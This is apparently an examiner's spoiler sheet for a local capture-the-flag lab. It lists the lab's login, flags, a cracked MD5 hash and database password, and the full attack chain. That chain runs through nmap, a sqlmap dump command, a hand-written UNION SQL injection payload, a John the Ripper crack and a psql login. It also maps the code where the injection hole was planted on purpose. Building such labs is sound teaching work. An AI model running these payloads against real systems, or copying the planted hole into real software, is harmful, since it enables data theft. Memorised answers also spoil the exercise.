# Ground truth — `ctf/leak-crack-db` (Cycle-3)

**SPOILERS.** Examiner / Blue / writeup authors only.

| Field | Value |
|-------|--------|
| Branch | `ctf/leak-crack-db` |
| Overlay | `infra/docker-compose.ctf-leak.yml` |
| Examiner | `./infra/ctf-leak-examiner.sh` |

---

## Locked secrets

| Item | Value |
|------|--------|
| App login | `user@kc.test` / `UserPass123!` (`sub` = `9001`) |
| Plant file | `ops-reminder.txt` (public share) |
| Share token | `b7e6d5c4a3928170605f4e3d2c1b0a9f8e7d6c5b4a3928170605f4e3d2c1b0a9` |
| MD5 (legacy ops) | `19047e75065a16b851b512cd3b0c8fb5` |
| John plaintext | `LeakDb2026!` |
| Postgres lab role | `ctf_ro` / `LeakDb2026!` on host port **5433** |
| App DB role | `kc_app` / `.env` `DB_PASSWORD` (default `kc-app-change-me`) — **not** the John target |
| Admin DB | `postgres` / `.env` `DB_ADMIN_PASSWORD` — strong; not required for clear |

### Flags

| Tier / label | Value (32 hex) | How |
|--------------|----------------|-----|
| `local` / local.txt | `7a8b9c0d1e2f30415263748596a7b8c9` | `GET /api/files?q=` SQLi (`CTF_MODE`) → sqlmap / UNION |
| `proof` / proof.txt | `1f2e3d4c5b6a79887766554433221100` | `psql` as `ctf_ro`: `SELECT flag FROM ctf_flags WHERE tier='proof'` |

RLS: `kc_app` can SELECT `tier='local'` only; `ctf_ro` can SELECT `tier='proof'` only.

---

## Full chain

```text
[1] nmap -sV -p 1-10000 127.0.0.1   → 8080/http, 5433/postgresql
[2] Login user@kc.test / UserPass123!
[3] Sharing → public share → download ops-reminder.txt
      → MD5 + hint GET /api/files?q=
[4] My Files search or Burp on q → sqlmap → local flag from ctf_flags
[5] john/hashcat MD5 → LeakDb2026!
[6] psql -h 127.0.0.1 -p 5433 -U ctf_ro -d kc_prod → proof flag
```

### Plant body (approx.)

```text
legacy ops md5 (rotate me):
19047e75065a16b851b512cd3b0c8fb5

If file search is flaky again, try GET /api/files?q=
```

### sqlmap (example)

```bash
TOKEN='<access JWT>'
sqlmap -u 'http://127.0.0.1:8080/api/files?q=test' \
  --header="Authorization: Bearer $TOKEN" \
  --batch --dbms=postgresql --technique=U \
  -D kc_prod -T ctf_flags --dump
```

Hand UNION (8 columns; `filename ILIKE '${q}'` — no wrapping `%`):

```text
' UNION SELECT flag, '9001', 'local.txt', 'text/plain', tier, 32, 'approved', '2026-01-01' FROM ctf_flags WHERE tier='local'--
```

UI search: use `%ops%` (or any `%…%`) for normal substring match; injection is via raw `q`.
### John (example)

```bash
echo '19047e75065a16b851b512cd3b0c8fb5' > hash.txt
john --format=raw-md5 hash.txt
# → LeakDb2026!
```

### psql

```bash
PGPASSWORD='LeakDb2026!' psql -h 127.0.0.1 -p 5433 -U ctf_ro -d kc_prod \
  -c "SELECT flag FROM ctf_flags WHERE tier='proof'"
```

---

## Secure path check

Compose **without** overlay:

- Postgres **not** on host `:5433`.
- `CTF_MODE` unset → `q` ignored; no string-concat SQLi path.

---

## Code map

| Piece | Path |
|-------|------|
| Overlay | `infra/docker-compose.ctf-leak.yml` |
| Mode flag | `backend/src/ctf/ctf-mode.ts` |
| Constants / plant | `backend/src/ctf/ctf.constants.ts` |
| Seed + RLS + `ctf_ro` | `backend/src/migrations/1777700000000-SeedLeakCrackCtf.ts` |
| SQLi | `backend/src/files/files.service.ts` `findAllCtfUnsafe` |
| Search UI | `frontend/app/files/page.tsx` |
